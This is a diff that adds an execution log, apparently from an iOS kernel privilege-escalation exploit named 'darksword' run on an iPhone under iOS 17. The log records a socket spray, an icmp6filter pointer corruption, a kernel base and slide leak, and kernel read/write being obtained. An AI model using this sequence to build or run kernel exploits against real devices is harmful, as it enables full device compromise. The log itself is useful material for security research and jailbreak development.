@@ -1,0 +1,86 @@
+[2026-05-05 15:30:24.604] === DS_RUN() ENTRY POINT ===
+[2026-05-05 15:30:24.607] generating random markers...
+[2026-05-05 15:30:24.608] random_marker: 0x31aedbdbb9c36954
+[2026-05-05 15:30:24.609] wired_page_marker: 0xd3aeb775c5f2e26b
+[2026-05-05 15:30:24.610] allocating default_file_content (32768 bytes)...
+[2026-05-05 15:30:24.611] filling default_file_content with random marker...
+[2026-05-05 15:30:24.612] default_file_content prepared
+[2026-05-05 15:30:24.613] === CALLING PE() ===
+[2026-05-05 15:30:24.614] === PE() ENTRY POINT ===
+[2026-05-05 15:30:24.615] checking for stashed krw primitives...
+[2026-05-05 15:30:24.615] no stashed krw, starting fresh exploit
+[2026-05-05 15:30:24.616] === DEVICE INFO ===
+[2026-05-05 15:30:24.617] device: iPhone12,3
+[2026-05-05 15:30:24.617] ispac: yes
+[2026-05-05 15:30:24.618] detected non-A18 device - using standard exploit path
+[2026-05-05 15:30:24.618] calling pe_init()...
+[2026-05-05 15:30:24.622] read_fd: 0x14
+[2026-05-05 15:30:24.623] write_fd: 0x15
+[2026-05-05 15:30:24.624] executable_path: /private/var/containers/Bundle/Application/E0C86DBA-A200-44FF-BEF8-ACCAD906734B/lara.app/lara
+[2026-05-05 15:30:24.625] host_executable_path: /private/var/containers/Bundle/Application/E0C86DBA-A200-44FF-BEF8-ACCAD906734B/lara.app/lara
+[2026-05-05 15:30:24.626] guest_executable_name: lara
+[2026-05-05 15:30:24.626] host_executable_name: lara
+[2026-05-05 15:30:24.627] kernel_process_name: lara
+[2026-05-05 15:30:24.628] livecontainer_bundle: no
+[2026-05-05 15:30:24.628] livecontainer_guest: no
+[2026-05-05 15:30:24.629] rehosted_process: no
+[2026-05-05 15:30:24.629] process_marker[0]: lara
+[2026-05-05 15:30:24.630] executable_name: lara
+[2026-05-05 15:30:24.631] free_thread_arg: 0x152de4000
+[2026-05-05 15:30:24.631] calling pe_v1()...
+[2026-05-05 15:30:24.634] physical_mapping_address: 0x112380000
+[2026-05-05 15:30:24.635] pc_object: 0xa303
+[2026-05-05 15:30:24.636] pc_address: 0x3ba6ac000
+[2026-05-05 15:30:24.832] spraying 22528 sockets...
+[2026-05-05 15:30:25.339] socket_ports_count: 0x5800
+[2026-05-05 15:30:25.340] start_pcb_id: 0x8
+[2026-05-05 15:30:25.340] end_pcb_id: 0xb006
+[2026-05-05 15:30:25.340] looking in search mapping: 0 / 8 (0.00%)
+[2026-05-05 15:30:25.529] matched PCB via process marker: lara
+[2026-05-05 15:30:25.530] pcb_start_offset: 0x0
+[2026-05-05 15:30:25.530] target_inp_gencnt: 0x1376
+[2026-05-05 15:30:25.530] inp_list_next_pointer: 0xffffffe02473c400
+[2026-05-05 15:30:25.530] icmp6filter: 0xffffffe1f0413da0
+[2026-05-05 15:30:25.530] corrupting icmp6filter pointer...
+[2026-05-05 15:30:25.544] target corrupted: 0xffffffe02473c548
+[2026-05-05 15:30:25.544] found control_socket at idx: 0x9b7
+[2026-05-05 15:30:25.580] pe_v1() completed
+[2026-05-05 15:30:25.581] exploit phase complete
+[2026-05-05 15:30:25.581] highest_success_idx: 381
+[2026-05-05 15:30:25.582] success_read_count: 43
+[2026-05-05 15:30:25.582] cleaning up threads...
+[2026-05-05 15:30:25.582] threads joined
+[2026-05-05 15:30:25.583] closing file descriptors...
+[2026-05-05 15:30:25.583] file descriptors closed
+[2026-05-05 15:30:25.583] === WALKING KERNEL STRUCTURES ===
+[2026-05-05 15:30:25.584] reading control_socket_pcb...
+[2026-05-05 15:30:25.584] control_socket_pcb: 0xffffffe02473c000
+[2026-05-05 15:30:25.584] reading pcbinfo_pointer...
+[2026-05-05 15:30:25.585] pcbinfo_pointer: 0xfffffff017766ea8
+[2026-05-05 15:30:25.585] reading ipi_zone...
+[2026-05-05 15:30:25.585] ipi_zone: 0xfffffff014e4cfa0
+[2026-05-05 15:30:25.586] reading zv_name...
+[2026-05-05 15:30:25.586] zv_name: 0xfffffff01453e985
+[2026-05-05 15:30:25.586] === SEARCHING FOR KERNEL BASE ===
+[2026-05-05 15:30:25.586] initial kernel_base guess: 0xfffffff01453c000
+[2026-05-05 15:30:25.587] candidate Mach-O at 0xfffffff0144d4000: filetype=2 cpuinfo=0x2c0000002 (iter=26)
+[2026-05-05 15:30:25.587] found MH_EXECUTE fallback at 0xfffffff0144d4000
+[2026-05-05 15:30:25.587] candidate Mach-O at 0xfffffff0144cc000: filetype=12 cpuinfo=0xc00000002 (iter=28)
+[2026-05-05 15:30:25.588] ‚úì found MH_FILESET header at 0xfffffff0144cc000
+[2026-05-05 15:30:25.588] === CALCULATING KERNEL SLIDE ===
+[2026-05-05 15:30:25.588] detected Intel/A-series chip
+[2026-05-05 15:30:25.589] ‚úì kernel_base:  0xfffffff0144cc000
+[2026-05-05 15:30:25.589] ‚úì kernel_slide: 0xd4c8000
+[2026-05-05 15:30:25.589] calling krw_sockets_leak_forever()...
+[2026-05-05 15:30:25.590] iOS 17: using so_count offset 0x24c
+[2026-05-05 15:30:25.590] krw_sockets_leak_forever() completed
+[2026-05-05 15:30:25.590] === KERNEL R/W IS READY ===
+[2026-05-05 15:30:25.590] getting our_proc and our_task...
+[2026-05-05 15:30:25.591] ‚úì our_proc: 0xffffffe024433298
+[2026-05-05 15:30:25.591] ‚úì our_task: 0xffffffe0244339d8
+[2026-05-05 15:30:25.592] stashkrw not available, skipping launchd transfer
+[2026-05-05 15:30:25.592] === PE() SUCCESS ===
+[2026-05-05 15:30:25.593] darksword exploit completed successfully
+[2026-05-05 15:30:25.593] ‚úì PE() SUCCESS
+[2026-05-05 15:30:25.593] cleaning up default_file_content...
+[2026-05-05 15:30:25.593] === DS_RUN() COMPLETE (result=0) ===
